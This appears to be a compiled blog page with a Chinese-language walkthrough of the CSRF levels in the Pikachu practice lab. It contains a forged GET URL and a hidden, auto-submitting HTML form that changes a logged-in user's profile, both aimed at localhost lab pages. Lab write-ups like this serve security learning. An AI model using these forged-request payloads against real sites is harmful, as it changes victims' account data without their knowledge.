import{_ as s,c as n,b as t,o as p}from"./app-CUDFWA7u.js";const e="/blog/assets/image-20220928193031898-Cge_z8U8.png",l="/blog/assets/image-20220928193147425-C85cPJfk.png",c="/blog/assets/image-20220928193645893-BFFdK-wt.png",o="/blog/assets/image-20220928194127864-xKOsroHB.png",u="/blog/assets/image-20220928194527721-BI4hhO0N.png",i="/blog/assets/image-20220928195847327-BvB_WmI9.png",r="/blog/assets/image-20220928192255896-CkVg6nVS.png",k={};function d(m,a){return p(),n("div",null,a[0]||(a[0]=[t('<h2 id="csrf-get-login" tabindex="-1"><a class="header-anchor" href="#csrf-get-login"><span>CSRF(get) login</span></a></h2><h3 id="分析" tabindex="-1"><a class="header-anchor" href="#分析"><span>分析</span></a></h3><p>不知道要干嘛，先根据提示登录进去</p><p>包里没看见上面特别之处 <s>除了用GET来传用户和密码</s></p><p><img src="'+e+'" alt="image-20220928193031898"></p><p>修改个人信息看看，给性别后面加个数字1，保存，这时候包里有问题了</p><p><img src="'+l+`" alt="image-20220928193147425"></p><p>发出去的数据没有验证用户之类的操作，感觉可以直接通过发包去改信息</p><h3 id="利用" tabindex="-1"><a class="header-anchor" href="#利用"><span>利用</span></a></h3><p>构造 URL ，尝试把性别该回去 boy</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre><code><span class="line">http://localhost/pikachu-master/vul/csrf/csrfget/csrf_get_edit.php?sex=boy&amp;phonenum=13676765545&amp;add=nba+hs&amp;email=grady%40pikachu.com&amp;submit=submi</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>直接访问，成功</p><p><img src="`+c+'" alt="image-20220928193645893"></p><h2 id="csrf-post" tabindex="-1"><a class="header-anchor" href="#csrf-post"><span>CSRF(post)</span></a></h2><h3 id="分析-1" tabindex="-1"><a class="header-anchor" href="#分析-1"><span>分析</span></a></h3><p>登录进来看包，暂时没有可利用的地方</p><p><img src="'+o+'" alt="image-20220928194127864">s</p><p>一样，改个人信息，看包，能利用</p><p><img src="'+u+`" alt="image-20220928194527721"></p><h3 id="利用-1" tabindex="-1"><a class="header-anchor" href="#利用-1"><span>利用</span></a></h3><p>构造一个假的链接放在服务器上，诱惑用户点击</p><div class="language-html line-numbers-mode" data-highlighter="prismjs" data-ext="html" data-title="html"><pre><code><span class="line"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span></span>
<span class="line">    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"></span>
<span class="line">        window<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">        document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">&quot;submit&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">        <span class="token punctuation">}</span></span>
<span class="line">    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span> </span>
<span class="line">    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span></span>
<span class="line">            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>http://localhost/pikachu/vul/csrf/csrfpost/csrf_post_edit.php<span class="token punctuation">&quot;</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>POST<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>    </span>
<span class="line">                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>hidden<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>sex<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>boy<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span></span>
<span class="line">                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>hidden<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>phonenum<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>13676765545<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span></span>
<span class="line">                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>hidden<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>add<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>nba hs<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span></span>
<span class="line">                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>hidden<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>email<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>grady@pikachu.com<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span></span>
<span class="line">                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>hidden<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span></span>
<span class="line">	            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>Submit request<span class="token punctuation">&quot;</span></span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span><span class="token value css language-css"><span class="token property">display</span><span class="token punctuation">:</span>none</span><span class="token punctuation">&quot;</span></span></span><span class="token punctuation">/&gt;</span></span></span>
<span class="line">            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span></span>
<span class="line">    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span></span>
<span class="line"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span> </span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>模拟访问 <code>http://localhost/pikachu-master/vul/csrf/csrfpost/post_attack.html</code> ，搞定，boy2 被改回来了</p><p><img src="`+i+`" alt="image-20220928195847327"></p><h2 id="csrf-token" tabindex="-1"><a class="header-anchor" href="#csrf-token"><span>CSRF Token</span></a></h2><h3 id="分析-2" tabindex="-1"><a class="header-anchor" href="#分析-2"><span>分析</span></a></h3><p>粗略分析了下，每次都是新 Token</p><p>Token是随机的，也就无法伪 URL 了</p><p><s>不过感觉理论上是可以爆破的就是，前面爆破写过，可参考前面的文章</s></p><h2 id="常见问题" tabindex="-1"><a class="header-anchor" href="#常见问题"><span>常见问题</span></a></h2><p><strong>CSRF (*) 报错</strong></p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre><code><span class="line">Warning: Use of undefined constant MYSQL_ASSOC - assumed &#39;MYSQL_ASSOC&#39; (this will throw an Error in a future version of PHP) in D:\\ProgramOthers\\phpstudy_pro\\WWW\\pikachu-master\\vul\\csrf\\csrfget\\csrf_get_edit.php on line 70</span>
<span class="line"></span>
<span class="line">Warning: mysqli_fetch_array() expects parameter 2 to be int, string given in D:\\ProgramOthers\\phpstudy_pro\\WWW\\pikachu-master\\vul\\csrf\\csrfget\\csrf_get_edit.php on line 70</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>猜想系MYSQL语法变更导致，找到对应目录，将 MYSQL_ASSOC 改为 MYSQLI_ASSOC即可</p><p><img src="`+r+'" alt="image-20220928192255896"></p>',34)]))}const h=s(k,[["render",d]]),v=JSON.parse('{"path":"/blogs/tech/security/web/Pikachu/03_CSRF.html","title":"PiKachu - CSRF","lang":"en-US","frontmatter":{"title":"PiKachu - CSRF","date":"2022-09-28T00:00:00.000Z","tags":["Web","security"],"categories":["tech"]},"headers":[{"level":2,"title":"CSRF(get) login","slug":"csrf-get-login","link":"#csrf-get-login","children":[{"level":3,"title":"分析","slug":"分析","link":"#分析","children":[]},{"level":3,"title":"利用","slug":"利用","link":"#利用","children":[]}]},{"level":2,"title":"CSRF(post)","slug":"csrf-post","link":"#csrf-post","children":[{"level":3,"title":"分析","slug":"分析-1","link":"#分析-1","children":[]},{"level":3,"title":"利用","slug":"利用-1","link":"#利用-1","children":[]}]},{"level":2,"title":"CSRF Token","slug":"csrf-token","link":"#csrf-token","children":[{"level":3,"title":"分析","slug":"分析-2","link":"#分析-2","children":[]}]},{"level":2,"title":"常见问题","slug":"常见问题","link":"#常见问题","children":[]}],"git":{"createdTime":1766928673000,"updatedTime":1766928673000,"contributors":[{"name":"PPPerryPan","email":"perrypan0123@outlook.com","commits":1}]},"filePathRelative":"blogs/tech/security/web/Pikachu/03_CSRF.md"}');export{h as comp,v as data};
